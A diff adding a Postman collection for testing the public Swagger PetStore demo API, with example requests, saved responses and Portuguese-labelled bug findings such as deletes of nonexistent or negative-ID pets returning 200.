@@ -1,0 +1,2542 @@
+{
+	"info": {
+		"_postman_id": "13cfadc3-736b-42b3-9f49-8dddac721c84",
+		"name": "PetStore API",
+		"description": "Link do Confluence com os relatos de Bugs\n\n- [https://bremeirah.atlassian.net/wiki/spaces/SOFTWAREDE/folder/21594113?atlOrigin=eyJpIjoiNzRiMWQ5NDM4NDFlNDZhY2I5YTA0ZjM4MDY2MWIzMzUiLCJwIjoiYyJ9](https://bremeirah.atlassian.net/wiki/spaces/SOFTWAREDE/folder/21594113?atlOrigin=eyJpIjoiNzRiMWQ5NDM4NDFlNDZhY2I5YTA0ZjM4MDY2MWIzMzUiLCJwIjoiYyJ9)",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "40096940",
+		"_collection_link": "https://bit-masters.postman.co/workspace/Bit-Masters-Workspace~6eb83ce7-3561-4c41-8114-60f4147c89ad/collection/40096940-13cfadc3-736b-42b3-9f49-8dddac721c84?action=share&source=collection_link&creator=40096940"
+	},
+	"item": [
+		{
+			"name": "Pet",
+			"item": [
+				{
+					"name": "Update an existing pet by Id.",
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"id\": 10,\r\n  \"name\": \"doggie\",\r\n  \"category\": {\r\n    \"id\": 1,\r\n    \"name\": \"Dogs\"\r\n  },\r\n  \"photoUrls\": [\r\n    \"string\"\r\n  ],\r\n  \"tags\": [\r\n    {\r\n      \"id\": 0,\r\n      \"name\": \"string\"\r\n    }\r\n  ],\r\n  \"status\": \"available\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/pet",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"pet"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Deletes a Pet.",
+					"request": {
+						"method": "DELETE",
+						"header": [],
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/pet/10",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"pet",
+								"10"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "Pet com ID negativo é deletado.",
+							"originalRequest": {
+								"method": "DELETE",
+								"header": [],
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/pet/-9999",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"-9999"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 17:38:43 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "11"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "Pet deleted"
+						},
+						{
+							"name": "Pet inexistente é possível deletar.",
+							"originalRequest": {
+								"method": "DELETE",
+								"header": [],
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/pet/900",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"900"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 20:03:26 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "11"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "Pet deleted"
+						}
+					]
+				},
+				{
+					"name": "pet",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"id\": 100,\r\n  \"name\": \"Nina\",\r\n  \"category\": {\r\n    \"id\": 2,\r\n    \"name\": \"Cat\"\r\n  },\r\n  \"photoUrls\": [\r\n    \"string\"\r\n  ],\r\n  \"tags\": [\r\n    {\r\n      \"id\": 0,\r\n      \"name\": \"string\"\r\n    }\r\n  ],\r\n  \"status\": \"sold\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{url}}/api/v3/pet",
+							"host": [
+								"{{url}}"
+							],
+							"path": [
+								"api",
+								"v3",
+								"pet"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "status 200 ok",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n  \"id\": 10,\r\n  \"name\": \"doggie\",\r\n  \"category\": {\r\n    \"id\": 1,\r\n    \"name\": \"Dogs\"\r\n  },\r\n  \"photoUrls\": [\r\n    \"string\"\r\n  ],\r\n  \"tags\": [\r\n    {\r\n      \"id\": 0,\r\n      \"name\": \"string\"\r\n    }\r\n  ],\r\n  \"status\": \"available\"\r\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{url}}/api/v3/pet",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Mon, 05 May 2025 13:22:19 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "137"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": 10,\n    \"category\": {\n        \"id\": 1,\n        \"name\": \"Dogs\"\n    },\n    \"name\": \"doggie\",\n    \"photoUrls\": [\n        \"string\"\n    ],\n    \"tags\": [\n        {\n            \"id\": 0,\n            \"name\": \"string\"\n        }\n    ],\n    \"status\": \"available\"\n}"
+						},
+						{
+							"name": "status 400 Bad request",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n  \"id\": number,\r\n  \"name\": \"doggie\",\r\n  \"category\": {\r\n    \"id\": 1,\r\n    \"name\": \"Dogs\"\r\n  },\r\n  \"photoUrls\": [\r\n    \"string\"\r\n  ],\r\n  \"tags\": [\r\n    {\r\n      \"id\": 0,\r\n      \"name\": \"string\"\r\n    }\r\n  ],\r\n  \"status\": \"available\"\r\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{url}}/api/v3/pet",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet"
+									]
+								}
+							},
+							"status": "Bad Request",
+							"code": 400,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Mon, 05 May 2025 13:22:47 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "94"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"code\": 400,\n    \"message\": \"Input error: unable to convert input to io.swagger.petstore.model.Pet\"\n}"
+						}
+					]
+				},
+				{
+					"name": "pet/{petId}",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"url": {
+							"raw": "{{url}}/api/v3/pet/10?name=Minnie&status=Cat",
+							"host": [
+								"{{url}}"
+							],
+							"path": [
+								"api",
+								"v3",
+								"pet",
+								"10"
+							],
+							"query": [
+								{
+									"key": "name",
+									"value": "Minnie"
+								},
+								{
+									"key": "status",
+									"value": "Cat"
+								}
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "status 200 ok",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"url": {
+									"raw": "{{url}}/api/v3/pet/10?name=Minnie&status=Cat",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"10"
+									],
+									"query": [
+										{
+											"key": "name",
+											"value": "Minnie"
+										},
+										{
+											"key": "status",
+											"value": "Cat"
+										}
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Mon, 05 May 2025 13:25:32 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "131"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": 10,\n    \"category\": {\n        \"id\": 1,\n        \"name\": \"Dogs\"\n    },\n    \"name\": \"Minnie\",\n    \"photoUrls\": [\n        \"string\"\n    ],\n    \"tags\": [\n        {\n            \"id\": 0,\n            \"name\": \"string\"\n        }\n    ],\n    \"status\": \"Cat\"\n}"
+						},
+						{
+							"name": "status 200 ok (BUG) - status invalid",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"url": {
+									"raw": "{{url}}/api/v3/pet/10?name=Minnie&status=10",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"10"
+									],
+									"query": [
+										{
+											"key": "name",
+											"value": "Minnie"
+										},
+										{
+											"key": "status",
+											"value": "10"
+										}
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Mon, 05 May 2025 13:27:04 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "130"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": 10,\n    \"category\": {\n        \"id\": 1,\n        \"name\": \"Dogs\"\n    },\n    \"name\": \"Minnie\",\n    \"photoUrls\": [\n        \"string\"\n    ],\n    \"tags\": [\n        {\n            \"id\": 0,\n            \"name\": \"string\"\n        }\n    ],\n    \"status\": \"10\"\n}"
+						}
+					]
+				},
+				{
+					"name": "pet/{petId}/uploadImage",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{url}}api/v3/pet/10/uploadImage",
+							"host": [
+								"{{url}}api"
+							],
+							"path": [
+								"v3",
+								"pet",
+								"10",
+								"uploadImage"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "pet/findByStatus",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test(\"Status 200 OK\", () => {\r",
+									"  pm.response.to.have.status(200);\r",
+									"});"
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						},
+						{
+							"listen": "prerequest",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{url}}/api/v3/pet/findByStatus?status=sold",
+							"host": [
+								"{{url}}"
+							],
+							"path": [
+								"api",
+								"v3",
+								"pet",
+								"findByStatus"
+							],
+							"query": [
+								{
+									"key": "status",
+									"value": "sold"
+								}
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "status 200 OK",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{url}}/api/v3/pet/findByStatus?status=available",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"findByStatus"
+									],
+									"query": [
+										{
+											"key": "status",
+											"value": "available"
+										}
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:09:17 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "6264"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "[\n    {\n        \"id\": 4,\n        \"category\": {\n            \"id\": 1,\n            \"name\": \"Dogs\"\n        },\n        \"name\": \"Dog 1\",\n        \"photoUrls\": [\n            \"url1\",\n            \"url2\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 1,\n                \"name\": \"tag1\"\n            },\n            {\n                \"id\": 2,\n                \"name\": \"tag2\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 3,\n        \"category\": {\n            \"id\": 2,\n            \"name\": \"a\"\n        },\n        \"name\": \"hshs\",\n        \"photoUrls\": [\n            \"a\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 3,\n                \"name\": \"asd\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 5564234180769000219,\n        \"category\": {\n            \"id\": 9070225841639725908,\n            \"name\": \"q|9.g`)U/j&;G;\"\n        },\n        \"name\": \"O7c_a&XdIPEx?yCeCmc]6`|Epe$Y{igtvO1N{t/c^m1}.`G6k1)/4?b,II0kE|qF\",\n        \"photoUrls\": [],\n        \"tags\": [\n            {\n                \"id\": 7512562785331116418,\n                \"name\": \"kuB-Rb-ui7H#Q}TI1jUfujo{qi\"\n            },\n            {\n                \"id\": 256780271437404413,\n                \"name\": \"qJyM'!pz}>;gpzt{9A<?pGSuu*Ic(\"\n            },\n            {\n                \"id\": 8155936153878275842,\n                \"name\": \"mE`R}.b<R-BM-voM/G^:Kc+NKNvo[R5u|'hj[B\"\n            },\n            {\n                \"id\": 2596194896564302395,\n                \"name\": \"S_OU__f+~sG*YK2&zL\"\n            },\n            {\n                \"id\": 3716129054702054855,\n                \"name\": \"6ZLpPlqk?iGbM]HZ2{.s?=YO&XXJ6`#w|u5#e%l<hdl'q?QV';p-b]95F$;1\"\n            },\n            {\n                \"id\": 6749085625019624597,\n                \"name\": \"jxHMhe}SWPT!8n/a+<7=E/q,(&gM!&]DU,#l\"\n            },\n            {\n                \"id\": 3784267581817879240,\n                \"name\": \"CoFgb4)a69N8g;QrN{.`(A'qBIy.9U,$EJc9!LDSSG1lT?\"\n            },\n            {\n                \"id\": 8822114933051025660,\n                \"name\": \"u(DYJe{x^j%_XWt5Zc.:a0*kf}YH6wE_C1aB+/EJYLC8K?4bMF(4OR79v=^iI`X-\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 2277727624137348645,\n        \"category\": {\n            \"id\": 9070225841639725908,\n            \"name\": \"q|9.g`)U/j&;G;\"\n        },\n        \"name\": \"1)/4?b,II0kE|qF?gBzL0TT0-G<?z2DqvMF/e?}By3RJ>IOZoa_2[D!V$zv~LW;R\",\n        \"photoUrls\": [],\n        \"tags\": [\n            {\n                \"id\": 7512562785331116418,\n                \"name\": \"kuB-Rb-ui7H#Q}TI1jUfujo{qi\"\n            },\n            {\n                \"id\": 256780271437404413,\n                \"name\": \"qJyM'!pz}>;gpzt{9A<?pGSuu*Ic(\"\n            },\n            {\n                \"id\": 8155936153878275842,\n                \"name\": \"mE`R}.b<R-BM-voM/G^:Kc+NKNvo[R5u|'hj[B\"\n            },\n            {\n                \"id\": 2596194896564302395,\n                \"name\": \"S_OU__f+~sG*YK2&zL\"\n            },\n            {\n                \"id\": 3716129054702054855,\n                \"name\": \"6ZLpPlqk?iGbM]HZ2{.s?=YO&XXJ6`#w|u5#e%l<hdl'q?QV';p-b]95F$;1\"\n            },\n            {\n                \"id\": 6749085625019624597,\n                \"name\": \"jxHMhe}SWPT!8n/a+<7=E/q,(&gM!&]DU,#l\"\n            },\n            {\n                \"id\": 3784267581817879240,\n                \"name\": \"CoFgb4)a69N8g;QrN{.`(A'qBIy.9U,$EJc9!LDSSG1lT?\"\n            },\n            {\n                \"id\": 8822114933051025660,\n                \"name\": \"u(DYJe{x^j%_XWt5Zc.:a0*kf}YH6wE_C1aB+/EJYLC8K?4bMF(4OR79v=^iI`X-\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 12345,\n        \"category\": {\n            \"id\": 1,\n            \"name\": \"dogs\"\n        },\n        \"name\": \"\",\n        \"photoUrls\": [\n            \"https://fluffydog.img\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 0,\n                \"name\": \"tag1\"\n            },\n            {\n                \"id\": 1,\n                \"name\": \"tag2\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 15,\n        \"category\": {\n            \"id\": 1,\n            \"name\": \"Dogs\"\n        },\n        \"name\": \"doggie\",\n        \"photoUrls\": [\n            \"string\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 0,\n                \"name\": \"string\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 123456,\n        \"name\": \"doggie\",\n        \"photoUrls\": [],\n        \"tags\": [],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 999,\n        \"name\": \"test\",\n        \"photoUrls\": [],\n        \"tags\": [],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 1923912391239120,\n        \"category\": {\n            \"id\": 1,\n            \"name\": \"Dogs\"\n        },\n        \"name\": \"doggie\",\n        \"photoUrls\": [\n            \"string\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 0,\n                \"name\": \"string\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 78941621110528130,\n        \"category\": {\n            \"id\": 5693435386663838,\n            \"name\": \"Dogs\"\n        },\n        \"name\": \"doggie\",\n        \"photoUrls\": [\n            \"example_string\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 6684782647618949,\n                \"name\": \"example_string\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 9,\n        \"category\": {\n            \"id\": 4,\n            \"name\": \"Lions\"\n        },\n        \"name\": \"Canelo\",\n        \"photoUrls\": [\n            \"url1\",\n            \"url2\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 1,\n                \"name\": \"tag3\"\n            },\n            {\n                \"id\": 2,\n                \"name\": \"tag4\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 100,\n        \"category\": {\n            \"id\": 105,\n            \"name\": \"cats\"\n        },\n        \"name\": \"bruce\",\n        \"photoUrls\": [\n            \"string\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 100,\n                \"name\": \"frajola\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 5213133252120577345,\n        \"category\": {\n            \"id\": 7457018657180232091,\n            \"name\": \"z(R9~VL']VP4UgqEj&3sj)z\"\n        },\n        \"name\": \"2uUMHKvNL,_PqP'UW-y\",\n        \"photoUrls\": [\n            \"xl6ausV:ze!%)P?]'{8-PI#M3jJ~$~g-62\",\n            \"U2)?#!io](5c]D?5*-nXY.F4G|Q6-*ngIm_~y\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 550376411036035038,\n                \"name\": \"6c0;#t&mecBhi$>m5DpX((w\"\n            },\n            {\n                \"id\": 5708072040781835203,\n                \"name\": \"aliYY3%;H}Q%^GHzw{^9[T,}H|^rh;b8T[=|}f.QAgnf>}HSKt5M/)+ip/1C\"\n            },\n            {\n                \"id\": 8985639566925020555,\n                \"name\": \"ITYeQ?I_.zmzMP-'2q,ym8_N%+Z)%]D+k,U}TULbmE^p\"\n            },\n            {\n                \"id\": 8661061504822303776,\n                \"name\": \")!v`5c(4swTb_Y0~sc'kjuetH6jiplrKKWi+f'tmwAhyOR7\"\n            },\n            {\n                \"id\": 6393340193169096310,\n                \"name\": \"VRGcQ]Qu?d4X&(,Ha9aIL3g]jRinij3}7{)~>3L0(\"\n            },\n            {\n                \"id\": 2269434098780501933,\n                \"name\": \"6H,+A`O$FE%JiWI_h`9b|O_WfR;Qi(W]5+Rz\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 5344875704796977653,\n        \"category\": {\n            \"id\": 7457018657180232091,\n            \"name\": \"z(R9~VL']VP4UgqEj&3sj)z\"\n        },\n        \"name\": \"2uUMHKvNL,_PqP'UW-y\",\n        \"photoUrls\": [\n            \"xl6ausV:ze!%)P?]'{8-PI#M3jJ~$~g-62\",\n            \"](5c]D?5*-nXY.F4G|Q6-*ngIm_~y{lJ2-L8wEWf]eV^qXL,Ve}bprB~Iw`J?khf\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 550376411036035038,\n                \"name\": \"6c0;#t&mecBhi$>m5DpX((w\"\n            },\n            {\n                \"id\": 5708072040781835203,\n                \"name\": \"aliYY3%;H}Q%^GHzw{^9[T,}H|^rh;b8T[=|}f.QAgnf>}HSKt5M/)+ip/1C\"\n            },\n            {\n                \"id\": 8985639566925020555,\n                \"name\": \"ITYeQ?I_.zmzMP-'2q,ym8_N%+Z)%]D+k,U}TULbmE^p\"\n            },\n            {\n                \"id\": 8661061504822303776,\n                \"name\": \")!v`5c(4swTb_Y0~sc'kjuetH6jiplrKKWi+f'tmwAhyOR7\"\n            },\n            {\n                \"id\": 6393340193169096310,\n                \"name\": \"VRGcQ]Qu?d4X&(,Ha9aIL3g]jRinij3}7{)~>3L0(\"\n            },\n            {\n                \"id\": 2269434098780501933,\n                \"name\": \"6H,+A`O$FE%JiWI_h`9b|O_WfR;Qi(W]5+Rz\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 5061184568136501460,\n        \"category\": {\n            \"id\": 7457018657180232091,\n            \"name\": \"z(R9~VL']VP4UgqEj&3sj)z\"\n        },\n        \"name\": \"2uUMHKvNL,_PqP'UW-y\",\n        \"photoUrls\": [\n            \"xl6ausV:ze!%)P?]'{8-PI#M3jJ~$~g-62\",\n            \"U2)?#!io](5c]D?5*-nXY.F4G|Q6-*ngIm_~y\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 550376411036035038,\n                \"name\": \"6c0;#t&mecBhi$>m5DpX((w\"\n            },\n            {\n                \"id\": 5708072040781835203,\n                \"name\": \"aliYY3%;H}Q%^GHzw{^9[T,}H|^rh;b8T[=|}f.QAgnf>}HSKt5M/)+ip/1C\"\n            },\n            {\n                \"id\": 8985639566925020555,\n                \"name\": \"ITYeQ?I_.zmzMP-'2q,ym8_N%+Z)%]D+k,U}TULbmE^p\"\n            },\n            {\n                \"id\": 8661061504822303776,\n                \"name\": \")!v`5c(4swTb_Y0~sc'kjuetH6jiplrKKWi+f'tmwAhyOR7\"\n            },\n            {\n                \"id\": 6393340193169096310,\n                \"name\": \"VRGcQ]Qu?d4X&(,Ha9aIL3g]jRinij3}7{)~>3L0(\"\n            },\n            {\n                \"id\": 2269434098780501933,\n                \"name\": \"6H,+A`O$FE%JiWI_h`9b|O_WfR;Qi(W]5+Rz\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 7202036232375426347,\n        \"category\": {\n            \"id\": 7457018657180232091,\n            \"name\": \"z(R9~VL']VP4UgqEj&3sj)z\"\n        },\n        \"name\": \"2uUMHKvNL,_PqP'UW-y\",\n        \"photoUrls\": [\n            \"xl6ausV:ze!%)P?]'{8-PI#M3jJ~$~g-62\",\n            \"U2)?#!io](5c]D?5*-nXY.F4G|Q6-*ngIm_~y\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 550376411036035038,\n                \"name\": \"6c0;#t&mecBhi$>m5DpX((w\"\n            },\n            {\n                \"id\": 5708072040781835203,\n                \"name\": \"aliYY3%;H}Q%^GHzw{^9[T,}H|^rh;b8T[=|}f.QAgnf>}HSKt5M/)+ip/1C\"\n            },\n            {\n                \"id\": 8985639566925020555,\n                \"name\": \"ITYeQ?I_.zmzMP-'2q,ym8_N%+Z)%]D+k,U}TULbmE^p\"\n            },\n            {\n                \"id\": 8661061504822303776,\n                \"name\": \")!v`5c(4swTb_Y0~sc'kjuetH6jiplrKKWi+f'tmwAhyOR7\"\n            },\n            {\n                \"id\": 6393340193169096310,\n                \"name\": \"VRGcQ]Qu?d4X&(,Ha9aIL3g]jRinij3}7{)~>3L0(\"\n            },\n            {\n                \"id\": 2269434098780501933,\n                \"name\": \"6H,+A`O$FE%JiWI_h`9b|O_WfR;Qi(W]5+Rz\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 8,\n        \"category\": {\n            \"id\": 11,\n            \"name\": \"auau\"\n        },\n        \"name\": \"doggssssss\",\n        \"photoUrls\": [\n            \"string\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 0,\n                \"name\": \"string\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 1287138758235,\n        \"name\": \"Woofy Mc Woof\",\n        \"photoUrls\": [],\n        \"tags\": [],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 1,\n        \"name\": \"Pet1\",\n        \"photoUrls\": [\n            \"test1\",\n            \"test2\"\n        ],\n        \"tags\": [],\n        \"status\": \"available\"\n    }\n]"
+						},
+						{
+							"name": "status 400 Bad Request",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{url}}/api/v3/pet/findByStatus?status=none",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"findByStatus"
+									],
+									"query": [
+										{
+											"key": "status",
+											"value": "none"
+										}
+									]
+								}
+							},
+							"status": "Bad Request",
+							"code": 400,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:17:36 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "134"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
